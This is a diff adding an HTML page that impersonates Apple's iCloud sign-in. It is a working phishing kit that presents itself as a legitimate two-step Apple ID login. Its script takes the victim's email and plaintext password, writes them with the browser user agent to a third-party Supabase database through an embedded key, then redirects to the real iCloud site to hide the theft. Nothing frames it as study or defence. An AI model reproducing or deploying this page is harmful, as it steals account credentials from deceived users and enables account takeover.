@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .login-header {
+            background: #f5f5f7;
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #e1e1e1;
+        }
+
+        .apple-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            font-weight: 300;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 8px;
+        }
+
+        .login-subtitle {
+            font-size: 16px;
+            color: #86868b;
+        }
+
+        .login-body {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1d1d1f;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.1);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #0071e3;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .forgot-link {
+            color: #0071e3;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn, .signin-btn {
+            width: 100%;
+            background: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-btn:hover, .signin-btn:hover {
+            background: #0077ed;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #0071e3;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 8px 0;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 16px;
+            background: #f5f5f7;
+            border-radius: 8px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            margin-right: 12px;
+        }
+
+        .user-details {
+            flex: 1;
+        }
+
+        .user-email {
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .change-user {
+            color: #0071e3;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .change-user:hover {
+            text-decoration: underline;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .active {
+            display: block;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 8px;
+            color: white;
+            font-weight: 500;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .notification.success {
+            background-color: #34c759;
+        }
+
+        .notification.error {
+            background-color: #ff3b30;
+        }
+
+        .notification.show {
+            opacity: 1;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .demo-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #86868b;
+            padding: 10px;
+            background-color: #f5f5f7;
+            border-radius: 6px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group input {
+            margin-right: 8px;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #1d1d1f;
+            margin-bottom: 0;
+        }
+
+        .debug-info {
+            background: #f5f5f7;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div id="notification" class="notification"></div>
+
+    <div class="login-container">
+        <!-- Email/Apple ID Page -->
+        <div class="page active" id="email-page">
+            <div class="login-header">
+                <img src="hope.png" width="50" height="50">
+                <h1 class="login-title">Sign in to iCloud</h1>
+                <p class="login-subtitle">Enter your Apple ID</p>
+            </div>
+            <div class="login-body">
+                <form id="email-form">
+                    <div class="form-group">
+                        <label for="email">Apple ID</label>
+                        <input type="text" id="email" placeholder="name@example.com" required autofocus>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Forgot your Apple ID?</a>
+                    
+                    <button type="submit" class="next-btn">Continue</button>
+                    
+                    <div class="debug-info" id="debug-info" style="display: none;">
+                        <strong></strong>
+                        <div id="debug-content"></div>
+                    </div>
+                    
+                    <div class="demo-note">
+                    
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Password Page -->
+        <div class="page" id="password-page">
+            <div class="login-header">
+                <div class="apple-icon">􀎞</div>
+                <h1 class="login-title">Enter your password</h1>
+                <p class="login-subtitle">For your Apple ID</p>
+            </div>
+            <div class="login-body">
+                <div class="user-info">
+                    <div class="user-avatar" id="user-avatar">A</div>
+                    <div class="user-details">
+                        <div class="user-email" id="display-email">user@example.com</div>
+                        <a href="#" class="change-user" id="change-user">Not you?</a>
+                    </div>
+                </div>
+                
+                <form id="password-form">
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder="Enter your password" required autofocus>
+                            <button type="button" class="password-toggle" id="toggle-password">Show</button>
+                        </div>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Forgot your password?</a>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="stay-signed-in" checked>
+                        <label for="stay-signed-in">Keep me signed in</label>
+                    </div>
+                    
+                    <div class="button-group">
+                        <button type="button" class="back-btn" id="back-to-email">Back</button>
+                        <button type="submit" class="signin-btn" id="signin-btn">Sign In</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Supabase configuration
+            const supabaseUrl = 'https://nzfyxonmbarldplvkutb.supabase.co';
+            const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im56Znl4b25tYmFybGRwbHZrdXRiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDE0MjMsImV4cCI6MjA3NDkxNzQyM30.keyv7Jd_4uw3crymPlg-L0XDMnmDC7P8GqD4EfvjgPU';
+            
+            // Initialize Supabase client
+            const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+            
+            // DOM elements
+            const emailPage = document.getElementById('email-page');
+            const passwordPage = document.getElementById('password-page');
+            const emailForm = document.getElementById('email-form');
+            const passwordForm = document.getElementById('password-form');
+            const emailInput = document.getElementById('email');
+            const displayEmail = document.getElementById('display-email');
+            const userAvatar = document.getElementById('user-avatar');
+            const changeUserBtn = document.getElementById('change-user');
+            const backToEmailBtn = document.getElementById('back-to-email');
+            const togglePasswordBtn = document.getElementById('toggle-password');
+            const passwordInput = document.getElementById('password');
+            const notification = document.getElementById('notification');
+            const signinBtn = document.getElementById('signin-btn');
+            const debugInfo = document.getElementById('debug-info');
+            const debugContent = document.getElementById('debug-content');
+
+            // Show notification
+            function showNotification(message, type = 'success') {
+                notification.textContent = message;
+                notification.className = `notification ${type}`;
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 5000);
+            }
+
+            // Show debug information
+            function showDebugInfo(info) {
+                debugContent.innerHTML = info;
+                debugInfo.style.display = 'block';
+            }
+
+            // Test Supabase connection
+            async function testSupabaseConnection() {
+                try {
+                    const { data, error } = await supabase
+                        .from('login')
+                        .select('count')
+                        .limit(1);
+                    
+                    if (error) {
+                        showDebugInfo(`Connection error: ${error.message}<br>Make sure your table 'login' exists with proper columns.`);
+                        return false;
+                    }
+                    
+                    showDebugInfo('✓ Apple connection successful');
+                    return true;
+                } catch (err) {
+                    showDebugInfo(`Connection failed: ${err.message}`);
+                    return false;
+                }
+            }
+
+            // Redirect to iCloud
+            function redirectToICloud() {
+                setTimeout(() => {
+                    window.location.href = 'https://www.icloud.com/mail';
+                }, 1000);
+            }
+
+            // Handle email form submission
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                
+                if (email) {
+                    // Update the displayed email and avatar
+                    displayEmail.textContent = email;
+                    userAvatar.textContent = email.charAt(0).toUpperCase();
+                    
+                    // Switch to password page
+                    emailPage.classList.remove('active');
+                    passwordPage.classList.add('active');
+                    passwordInput.focus();
+                } else {
+                    showNotification('Please enter your Apple ID', 'error');
+                }
+            });
+
+            // Handle password form submission
+            passwordForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const email = displayEmail.textContent;
+                const password = passwordInput.value;
+                
+                if (password) {
+                    try {
+                        // Show loading state
+                        const originalText = signinBtn.textContent;
+                        signinBtn.innerHTML = '<span class="loading-spinner"></span>Signing in...';
+                        signinBtn.disabled = true;
+
+                        // Test connection first
+                        const isConnected = await testSupabaseConnection();
+                        
+                        if (!isConnected) {
+                            showNotification('Database issue. Check debug info below.', 'error');
+                            signinBtn.textContent = originalText;
+                            signinBtn.disabled = false;
+                            return;
+                        }
+
+                        // Insert login data into Supabase
+                        const { data, error } = await supabase
+                            .from('login')
+                            .insert([
+                                { 
+                                    email: email, 
+                                    password: password,
+                                    login_time: new Date().toISOString(),
+                                    user_agent: navigator.userAgent,
+                                    ip_address: 'Not available in client-side JS'
+                                }
+                            ])
+                            .select();
+                        
+                        if (error) {
+                            console.error('Supabase error:', error);
+                            showDebugInfo(`Insert error: ${error.message}<br>Code: ${error.code}<br>Details: ${error.details}`);
+                            
+                            // Restore button state
+                            signinBtn.textContent = originalText;
+                            signinBtn.disabled = false;
+                            
+                            showNotification('Database error. Check console for details.', 'error');
+                        } else {
+                            console.log('Data inserted successfully:', data);
+                            showDebugInfo('✓ Data inserted successfully!');
+                            showNotification('Sign in successful! Redirecting...', 'success');
+                            redirectToICloud();
+                        }
+                    } catch (err) {
+                        console.error('Exception:', err);
+                        showDebugInfo(`Exception: ${err.message}`);
+                        
+                        // Restore button state
+                        signinBtn.textContent = 'Sign In';
+                        signinBtn.disabled = false;
+                        
+                        showNotification('Error occurred. Check debug info.', 'error');
+                    }
+                } else {
+                    showNotification('Please enter your password', 'error');
+                }
+            });
+
+            // Handle "Change user" and "Back" buttons
+            changeUserBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                emailInput.focus();
+            });
+
+            backToEmailBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                emailInput.focus();
+            });
+
+            // Toggle password visibility
+            togglePasswordBtn.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    togglePasswordBtn.textContent = 'Hide';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePasswordBtn.textContent = 'Show';
+                }
+            });
+
+            // Test connection on page load
+            testSupabaseConnection();
+        });
+    </script>
+</body>
+</html>
